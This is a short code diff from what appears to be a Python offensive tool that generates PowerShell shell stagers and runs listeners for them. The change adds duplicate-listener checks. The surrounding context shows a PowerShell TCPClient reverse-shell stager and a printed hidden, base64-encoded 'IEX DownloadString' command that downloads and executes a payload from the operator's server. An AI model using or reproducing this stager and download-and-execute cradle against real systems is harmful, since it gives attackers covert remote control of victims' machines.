@@ -9,7 +9,6 @@ def printListener():
         bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse: ' + t.normal).lower()
         if bindOrReverse == 'b' or bindOrReverse == 'r':
             break
-
     if bindOrReverse == 'r':
         windows_powershell_stager = (
             "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','5555');"
@@ -67,18 +66,20 @@ def printListener():
     print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if bindOrReverse == 'b':
-        ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
-        connectserver = Server(ipADDR, 5556, bindsocket=False)
-        serverlist.append(connectserver)
-        connectworker = Thread(target=asyncore.loop, args=(0.1,))
-        connectworker.setDaemon(True)
-        connectworker.start()
+        if not '5556' in str(serverlist):
+            ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
+            connectserver = Server(ipADDR, 5556, bindsocket=False)
+            serverlist.append(connectserver)
+            connectworker = Thread(target=asyncore.loop, args=(0.1,))
+            connectworker.setDaemon(True)
+            connectworker.start()
     else:
-        listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
-        serverlist.append(listenerserver)
-        listenerworker = Thread(target=asyncore.loop, args=(0.1,))
-        listenerworker.setDaemon(True)
-        listenerworker.start()
+        if not '5555' in str(serverlist):
+            listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
+            serverlist.append(listenerserver)
+            listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+            listenerworker.setDaemon(True)
+            listenerworker.start()
     return "pass"
 
 
